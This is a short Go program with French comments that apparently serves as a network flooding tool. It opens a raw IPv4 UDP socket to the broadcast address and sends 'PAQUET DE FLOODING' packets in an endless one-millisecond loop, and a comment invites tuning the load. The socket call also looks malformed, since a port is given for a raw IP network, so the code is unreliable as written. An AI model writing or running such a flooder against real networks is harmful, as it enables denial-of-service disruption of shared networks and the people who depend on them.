package main

import (
	"fmt"
	"net"
	"os"
	"time"
)

func main() {
	// Créer une socket RAW IPv4 (UDP)
	conn, err := net.Dial("ip4:udp", "255.255.255.255:0")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Erreur lors de la création de la socket : %v\n", err)
		return
	}
	defer conn.Close()

	// Envoyer des paquets en boucle
	for {
		
		_, err := conn.Write([]byte("PAQUET DE FLOODING\n"))
		if err != nil {
			fmt.Fprintf(os.Stderr, "Erreur lors de l'envoi du paquet : %v\n", err)
		}
		time.Sleep(1 * time.Millisecond) // Ajustez le délai selon le niveau de charge
	}
}